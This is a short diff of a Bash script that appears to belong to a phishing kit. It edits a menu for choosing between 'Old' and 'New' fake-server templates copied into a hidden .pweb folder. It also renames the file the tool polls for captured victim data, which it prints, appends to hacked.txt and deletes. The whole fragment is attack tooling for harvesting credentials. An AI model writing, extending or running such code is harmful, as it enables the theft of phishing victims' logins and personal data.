@@ -55,8 +55,8 @@ hidden
 mov(){
 	# Ask for theh the template
 	echo -e "\033[32;1m Choose the server "
-	echo -ne "\033[31;1m[01] \033[33;1m  Old\n"
-	echo -ne "\033[31;1m[02] \033[33;1m  New\n"
+	echo -ne "\033[31;1m[01] \033[33;1m  New\n"
+	echo -ne "\033[31;1m[02] \033[33;1m  Old\n"
 	read u_option # reading for user options 
 	if [[ $u_option == "1" ]] || [[ $u_option == "01" ]];then
 	cp -R server1/* .pweb > /dev/null
@@ -139,13 +139,13 @@ ask_server
 # make a function to check the data 
 user_data(){
    while true;do
-		if [[ -f .pweb/userd.txt ]];then
+		if [[ -f .pweb/userlog.txt ]];then
 			echo -e "${g}[${w}+${g}] ${y} User data found ${w}"
 			echo " "
-			cat .pweb/userd.txt
+			cat .pweb/userlog.txt
 			echo -e "\n"
-			cat .pweb/userd.txt >> hacked.txt
-			rm -rf .pweb/userd.txt
+			cat .pweb/userlog.txt >> hacked.txt
+			rm -rf .pweb/userlog.txt
 			echo -e "${w}[${r}+${w}] ${y} Saving data into hacked.txt"
 			echo " "
 		fi
